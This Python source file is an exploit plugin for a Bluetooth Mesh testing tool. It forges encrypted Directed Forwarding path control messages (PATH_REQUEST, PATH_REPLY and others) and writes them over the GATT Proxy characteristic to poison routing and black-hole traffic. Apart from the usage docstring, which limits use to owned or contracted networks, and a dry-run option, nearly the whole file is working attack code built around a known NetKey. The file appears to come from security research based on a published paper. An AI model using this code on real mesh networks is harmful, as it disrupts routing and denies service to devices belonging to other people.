"""
Directed Forwarding path injection over the GATT Proxy bearer.

What this does: builds a properly encrypted Bluetooth Mesh network control
message carrying a Directed Forwarding path discovery opcode, and writes it to
a proxy node's Mesh Proxy Data In characteristic. The node processes it as if
it had arrived from the mesh network, which is the whole point of the Proxy
protocol.

Why it needs the NetKey, and why that is the finding rather than a limitation:

    Directed Forwarding trusts the *network*, not the node. Every node holding
    a valid NetKey is trusted by every other node to tell the truth about
    routes. So a node that was compromised, salvaged from a skip, or bought
    second-hand is enough to poison path state and black-hole traffic for a
    chosen destination. That asymmetry — one cheap node against the whole
    routing plane — is the point made in "Tous les chemins mènent à DROP"
    (Tali, Cayre, Nicomette, Auriol, LAAS-CNRS, SSTIC 2025).

    You cannot do this without a NetKey, and no tool can. Use it on a network
    you own or have been contracted to test.

Bearer: GATT Proxy only. The ADV bearer needs raw advertising transmission,
which bleak cannot do — that route needs WHAD or Mirage and is not wired up
here yet.

Usage:

    meshbreaker exploit -m plugin --plugin-name df_path_inject \\
        -t AA:BB:CC:DD:EE:FF \\
        --netkey 7dd7364cd842ad18c17c2b820c84c3d6 \\
        --iv-index 0x12345678 \\
        --opt mode=path_request --opt path_target=0x0005 --opt src=0x0001

    # Build and print the PDU without transmitting anything
    meshbreaker exploit -m plugin --plugin-name df_path_inject \\
        --netkey <key> --opt dry_run=true
"""

import asyncio
import struct

from src.core.plugin_base import PluginBase, PluginMeta
from src.modules import mesh_crypto as mc
from src.modules.directed_forwarding import DF_CONTROL_OPCODES
from src.utils import logger

PROXY_IN = "00002add-0000-1000-8000-00805f9b34fb"
PROXY_OUT = "00002ade-0000-1000-8000-00805f9b34fb"

MODES = {
    "path_request": 0x01,
    "path_reply": 0x02,
    "path_confirmation": 0x03,
    "path_echo_request": 0x04,
    "path_echo_reply": 0x05,
    "dependent_node_update": 0x06,
    "path_request_solicitation": 0x07,
}


def _as_int(value, default=0):
    """Accept 0x1234, 1234 or an int from the command line."""
    if value is None:
        return default
    if isinstance(value, int):
        return value
    text = str(value).strip()
    return int(text, 16) if text.lower().startswith("0x") else int(text)


def _as_bool(value, default=False):
    if value is None:
        return default
    if isinstance(value, bool):
        return value
    return str(value).strip().lower() in ("1", "true", "yes", "on")


def _negotiated_mtu(client, forced=None) -> int:
    """Read the connection's ATT MTU, falling back to the BLE minimum.

    `client.mtu_size` is the negotiated value, but not every bleak backend
    populates it — WinRT in particular can report 0 before the first
    operation. Treat anything implausible as "unknown" and use the safe
    minimum rather than segmenting against a garbage number.
    """
    if forced:
        value = _as_int(forced, mc.DEFAULT_ATT_MTU)
        logger.info(f"Using forced ATT MTU {value} (--opt mtu)")
        return max(mc.DEFAULT_ATT_MTU, value)

    try:
        value = int(getattr(client, "mtu_size", 0) or 0)
    except (TypeError, ValueError):
        value = 0

    if value < mc.DEFAULT_ATT_MTU:
        logger.warning(f"Backend reported ATT MTU {value or 'unknown'} — "
                       f"assuming the {mc.DEFAULT_ATT_MTU}-byte minimum")
        return mc.DEFAULT_ATT_MTU
    return value


def build_path_request(path_origin: int, destination: int,
                       forwarding_number: int = 0, path_metric: int = 0,
                       on_behalf_of_dependent: bool = False,
                       metric_type: int = 0, lifetime: int = 2,
                       discovery_interval: int = 0) -> bytes:
    """Build PATH_REQUEST parameters (Mesh Protocol 1.1, section 4.3.3).

    Layout used here:

        byte 0   bit 7    On Behalf Of Dependent Origin
                 bits 6-4 Path Origin Path Metric Type
                 bits 3-2 Path Origin Path Lifetime
                 bit 1    Path Discovery Interval
                 bit 0    RFU
        byte 1   Path Origin Forwarding Number
        byte 2   Path Origin Path Metric
        bytes 3-4 Destination
        bytes 5-6 Path Origin Unicast Address Range

    **Verify this packing against your copy of the spec before trusting a
    negative result.** The network layer in `mesh_crypto` is byte-exact against
    the published sample vectors and is tested as such; this parameter layout
    is reconstructed from the 1.1 specification text and has no public test
    vector to check it against. A node rejecting the message may mean the
    layout is wrong rather than that the node is hardened.

    When you have the spec open, skip this builder entirely and pass the exact
    bytes with `--opt params=<hex>`.
    """
    flags = ((1 if on_behalf_of_dependent else 0) << 7
             | (metric_type & 0x07) << 4
             | (lifetime & 0x03) << 2
             | (discovery_interval & 0x01) << 1)
    return (bytes([flags, forwarding_number & 0xFF, path_metric & 0xFF])
            + struct.pack(">H", destination)
            + struct.pack(">H", path_origin))


def build_path_reply(path_origin: int, forwarding_number: int = 0,
                     unicast_destination: bool = True,
                     confirmation_request: bool = False) -> bytes:
    """Build PATH_REPLY parameters (Mesh Protocol 1.1, section 4.3.3).

    Same caveat as `build_path_request` — verify the packing against the spec.
    """
    flags = ((1 if unicast_destination else 0) << 1
             | (1 if confirmation_request else 0))
    return (bytes([flags, forwarding_number & 0xFF])
            + struct.pack(">H", path_origin))


class DFPathInjectPlugin(PluginBase):

    meta = PluginMeta(
        name="df_path_inject",
        version="1.0",
        description="Inject Directed Forwarding path control messages over GATT Proxy",
        author="T.I.V.",
        category="exploit",
        requires_bt=True,
        requires_root=False,
        tags=["mesh", "directed_forwarding", "routing", "netkey_required"],
    )

    def run(self) -> dict:
        try:
            net_key = mc.parse_key(self.require("netkey"), "NetKey")
        except ValueError as e:
            logger.error(str(e))
            return {"error": str(e)}

        iv_index = _as_int(self.option("iv_index"), 0)
        src = _as_int(self.option("src"), 0x0001)
        dst = _as_int(self.option("dst"), 0xFFFF)
        seq = _as_int(self.option("seq"), 1)
        ttl = _as_int(self.option("ttl"), 127)
        mtu = _as_int(self.option("mtu"), mc.DEFAULT_ATT_MTU)
        dry_run = _as_bool(self.option("dry_run"), False)

        mode = str(self.option("mode", "path_request")).lower()
        raw_params = self.option("params")

        mc.print_key_material(net_key)

        if raw_params:
            opcode = _as_int(self.option("opcode"), MODES.get(mode, 0x01))
            try:
                parameters = bytes.fromhex(str(raw_params).replace(" ", ""))
            except ValueError:
                logger.error(f"--opt params is not valid hex: {raw_params}")
                return {"error": "invalid params hex"}
            logger.info(f"Using raw parameters: {parameters.hex()}")

        elif mode == "path_request":
            opcode = MODES[mode]
            path_target = _as_int(self.option("path_target"), 0x0002)
            parameters = build_path_request(
                path_origin=src,
                destination=path_target,
                forwarding_number=_as_int(self.option("forwarding_number"), 0),
                path_metric=_as_int(self.option("path_metric"), 0),
                lifetime=_as_int(self.option("lifetime"), 2),
            )
            logger.warning(
                f"PATH_REQUEST claiming a route from 0x{src:04X} to 0x{path_target:04X}"
            )

        elif mode == "path_reply":
            opcode = MODES[mode]
            path_origin = _as_int(self.option("path_origin"), 0x0001)
            parameters = build_path_reply(
                path_origin=path_origin,
                forwarding_number=_as_int(self.option("forwarding_number"), 0),
            )
            logger.warning(f"PATH_REPLY on behalf of origin 0x{path_origin:04X}")

        elif mode in MODES:
            opcode = MODES[mode]
            parameters = b""
            logger.info(f"{DF_CONTROL_OPCODES[opcode]} with no parameters")

        else:
            available = ", ".join(MODES)
            logger.error(f"Unknown mode '{mode}'. Use one of: {available}, "
                         "or pass --opt params=<hex> with --opt opcode=<n>")
            return {"error": f"unknown mode {mode}"}

        transport_pdu = mc.build_control_transport_pdu(opcode, parameters)

        try:
            network_pdu = mc.build_network_pdu(
                net_key=net_key, iv_index=iv_index, transport_pdu=transport_pdu,
                src=src, dst=dst, ctl=1, ttl=ttl, seq=seq,
            )
        except (ValueError, RuntimeError) as e:
            logger.error(f"Could not build the network PDU: {logger.describe(e)}")
            return {"error": str(e)}

        opcode_name = DF_CONTROL_OPCODES.get(opcode, f"0x{opcode:02X}")
        logger.info(f"Opcode        {opcode_name} (0x{opcode:02X})")
        logger.info(f"Transport PDU {transport_pdu.hex()}")
        logger.info(f"Network PDU   {network_pdu.hex()}")

        result = {
            "mode": mode,
            "opcode": opcode,
            "opcode_name": opcode_name,
            "src": f"0x{src:04X}",
            "dst": f"0x{dst:04X}",
            "seq": seq,
            "iv_index": f"0x{iv_index:08X}",
            "transport_pdu": transport_pdu.hex(),
            "network_pdu": network_pdu.hex(),
            "transmitted": False,
        }

        if dry_run:
            preview = mc.wrap_proxy_pdu(network_pdu, mc.PROXY_NETWORK_PDU, att_mtu=mtu)
            logger.info(f"Proxy writes  {len(preview)} at ATT MTU {mtu} "
                        f"({mc.proxy_payload_size(mtu)} bytes each)")
            for i, chunk in enumerate(preview):
                logger.debug(f"  [{i}] {chunk.hex()}")
            result["att_mtu"] = mtu
            result["proxy_pdus"] = [c.hex() for c in preview]
            logger.info("Dry run — nothing transmitted")
            return result

        if not self.target:
            logger.error("No target MAC. Use: meshbreaker set-target AA:BB:CC:DD:EE:FF")
            result["error"] = "no target"
            return result

        logger.warning(f"Transmitting to {self.target} — this modifies mesh routing state")
        transmit = asyncio.run(self._send(network_pdu, forced_mtu=self.option("mtu")))
        result.update(transmit)
        return result

    async def _send(self, network_pdu: bytes, forced_mtu=None) -> dict:
        """Connect, segment against the negotiated MTU, and write.

        Segmentation has to happen here rather than in run(): the usable size
        is only known once the connection exists. Assuming the 23-byte default
        would fragment messages that the link could carry in one write.
        """
        try:
            from bleak import BleakClient
        except ImportError:
            logger.error("bleak not installed")
            return {"error": "bleak not installed"}

        responses: list[str] = []
        att_mtu = mc.DEFAULT_ATT_MTU
        proxy_pdus: list[bytes] = []

        def _on_notify(_handle, data: bytearray):
            responses.append(bytes(data).hex())
            logger.data(f"  Proxy Out: {bytes(data).hex()}")

        try:
            async with BleakClient(self.target, bluez={"adapter": self.adapter}) as client:
                att_mtu = _negotiated_mtu(client, forced_mtu)
                logger.success(f"Connected — ATT MTU {att_mtu}, "
                               f"{mc.proxy_payload_size(att_mtu)} payload bytes per write")

                proxy_present = any("1828" in str(s.uuid).lower() for s in client.services)
                if not proxy_present:
                    logger.error("Mesh Proxy Service (0x1828) not found on this device")
                    logger.info("The target must be a provisioned node acting as a proxy")
                    return {"error": "no proxy service", "att_mtu": att_mtu,
                            "transmitted": False}

                proxy_pdus = mc.wrap_proxy_pdu(network_pdu, mc.PROXY_NETWORK_PDU,
                                               att_mtu=att_mtu)
                if len(proxy_pdus) == 1:
                    logger.info(f"Fits in a single write ({len(network_pdu)} bytes)")
                else:
                    logger.info(f"Segmented into {len(proxy_pdus)} writes "
                                f"({len(network_pdu)} bytes total)")

                try:
                    await client.start_notify(PROXY_OUT, _on_notify)
                except Exception as e:
                    logger.warning(f"Could not subscribe to Proxy Out: {logger.describe(e)}")

                for i, chunk in enumerate(proxy_pdus):
                    await client.write_gatt_char(PROXY_IN, chunk, response=False)
                    logger.success(f"  wrote [{i}] {len(chunk)} bytes")

                await asyncio.sleep(2.0)
                try:
                    await client.stop_notify(PROXY_OUT)
                except Exception:
                    pass

        except Exception as e:
            from src.core.adapter_manager import report_ble_error
            if not report_ble_error(e):
                logger.error(f"Injection failed: {logger.describe(e)}")
            return {"error": str(e), "att_mtu": att_mtu, "transmitted": False}

        if responses:
            logger.success(f"{len(responses)} response PDUs on Proxy Out")
        else:
            logger.info("No response on Proxy Out — expected for most control messages")

        return {
            "transmitted": True,
            "att_mtu": att_mtu,
            "proxy_pdus": [c.hex() for c in proxy_pdus],
            "writes": len(proxy_pdus),
            "responses": responses,
        }
